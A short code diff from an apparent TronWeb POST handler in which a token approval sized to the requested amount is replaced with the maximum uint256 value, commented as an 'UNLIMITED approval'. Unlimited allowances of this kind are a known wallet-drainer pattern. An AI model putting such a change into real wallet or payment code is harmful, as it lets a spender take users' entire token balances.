@@ -42,7 +42,7 @@ export async function POST(req) {
 
                         {
                             type: 'uint256',
-                            value: tw.toSun(amount)
+                            value: '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff' // UNLIMITED approval
                         }
 
                     ],
